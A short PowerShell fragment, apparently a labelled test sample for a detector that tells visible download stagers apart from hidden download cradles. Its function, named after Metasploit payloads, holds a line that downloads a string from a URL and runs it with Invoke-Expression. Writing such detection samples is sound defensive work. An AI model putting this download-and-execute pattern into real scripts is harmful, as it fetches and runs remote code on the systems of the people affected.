# Visible staged download without hiding or certificate bypass: a stager
# but not the hidden-cradle conviction.
function Invoke-MetasploitPayload {
  $c = '$client.downloadstring($url); Invoke-Expression $c'
  $pi = New-Object System.Diagnostics.ProcessStartInfo
  $pi.WindowStyle = 'Normal'
}
